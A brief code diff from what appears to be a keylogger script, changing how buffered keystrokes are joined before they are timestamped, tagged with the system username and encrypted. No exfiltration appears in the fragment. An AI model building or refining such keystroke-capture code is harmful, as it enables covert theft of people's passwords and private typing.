@@ -44,7 +44,7 @@ def main():
                     buffer = merge(buffer,keys)
 
                 if buffer:
-                    data = " | ".join(f"{k}: {', '.join(v)}" for k, v in buffer.items())
+                    data = " | ".join(f"{k}: {''.join(v)}" for k, v in buffer.items())
                     timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                     data = f"[{timestamp}] \n [user name: {Systeminfo["username"]}] \n{data}"
                     encrypted_bytes = encryptor.encrypt(data)                          # Encrypt using your Encryptor
